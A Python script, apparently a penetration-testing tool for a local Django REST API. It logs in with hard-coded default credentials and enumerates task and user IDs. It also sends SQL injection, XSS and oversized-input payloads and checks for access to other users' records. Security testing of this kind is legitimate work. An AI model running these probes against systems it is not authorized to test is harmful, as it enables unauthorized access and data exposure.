import requests
from requests.auth import HTTPBasicAuth
import random
import string
import json
import os

BASE_URL = "http://127.0.0.1:8000"  # Replace with your API URL
ADMIN_CREDENTIALS = ("admin", "root")  # Update with valid credentials
RESULTS_FILE = "results.txt"

# Colors for terminal output
RESET = "\033[0m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"

# Initialize the results file
if os.path.exists(RESULTS_FILE):
    os.remove(RESULTS_FILE)

def log_to_file(message):
    """Write log messages to the results file."""
    with open(RESULTS_FILE, "a") as file:
        file.write(message + "\n")

def log(message, status="info"):
    """Print log messages to the terminal and save to the results file."""
    if status == "success":
        print(f"{GREEN}[+] {message}{RESET}")
        log_to_file(f"[SUCCESS] {message}")
    elif status == "error":
        print(f"{RED}[-] {message}{RESET}")
        log_to_file(f"[ERROR] {message}")
    else:
        print(f"{YELLOW}[!] {message}{RESET}")
        log_to_file(f"[INFO] {message}")

# Helper Functions
def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_boolean():
    return random.choice([True, False])

def test_authentication():
    log("Testing Authentication", "info")
    response = requests.get(f"{BASE_URL}/api/", auth=HTTPBasicAuth(*ADMIN_CREDENTIALS))
    if response.status_code == 200:
        log("Authentication successful!", "success")
        log(f"Response: {response.text}", "info")
    else:
        log("Authentication failed.", "error")
        log(f"Status Code: {response.status_code}\nResponse: {response.text}", "error")

def brute_force_task_ids():
    log("Brute-forcing Task IDs", "info")
    for app_id in range(1, 20):  # Adjust range based on expected task count
        url = f"{BASE_URL}/api/{app_id}/"
        response = requests.get(url, auth=HTTPBasicAuth(*ADMIN_CREDENTIALS))
        if response.status_code == 200:
            log(f"Task ID {app_id} found! Response: {response.text}", "success")
        elif response.status_code == 404:
            log(f"Task ID {app_id} does not exist.", "error")
        else:
            log(f"Unexpected response for Task ID {app_id}: {response.status_code}", "error")

def user_enumeration():
    log("Testing User Enumeration", "info")
    for user_id in range(1, 10):  # Adjust range based on expected user count
        response = requests.get(f"{BASE_URL}/api/{user_id}/", auth=HTTPBasicAuth(*ADMIN_CREDENTIALS))
        if response.status_code == 200:
            log(f"User with ID {user_id} exists! Response: {response.text}", "success")
        elif response.status_code == 403:
            log(f"User {user_id} is restricted (403 Forbidden).", "info")
        else:
            log(f"User {user_id} does not exist (404 Not Found).", "error")

def exploit_input_validation():
    log("Testing Input Validation Exploits", "info")
    payloads = [
        {"task": "' OR 1=1; --", "description": "SQL Injection test", "completed": False},
        {"task": "<script>alert('XSS');</script>", "description": "XSS test", "completed": False},
        {"task": "A" * 10000, "description": "Buffer Overflow test", "completed": False},
    ]

    for payload in payloads:
        response = requests.post(f"{BASE_URL}/api/", json=payload, auth=HTTPBasicAuth(*ADMIN_CREDENTIALS))
        if response.status_code == 201:
            log(f"Payload successful: {json.dumps(payload)}", "success")
        else:
            log(f"Payload failed: {json.dumps(payload)}", "error")
            log(f"Response: {response.status_code} | {response.text}", "info")

def access_other_user_tasks():
    log("Testing Access to Other User's Tasks", "info")
    response = requests.get(f"{BASE_URL}/api/1/", auth=HTTPBasicAuth(*ADMIN_CREDENTIALS))
    if response.status_code == 200:
        log(f"Accessed another user's task! Response: {response.text}", "success")
    else:
        log("Failed to access another user's task.", "error")
        log(f"Response: {response.status_code} | {response.text}", "info")

if __name__ == "__main__":
    print("=== Refined Django API Exploit Tool with Logging ===")
    log_to_file("=== Refined Django API Exploit Tool Results ===")
    test_authentication()
    user_enumeration()
    brute_force_task_ids()
    exploit_input_validation()
    access_other_user_tasks()
    log("Testing completed. Results saved to results.txt.", "info")
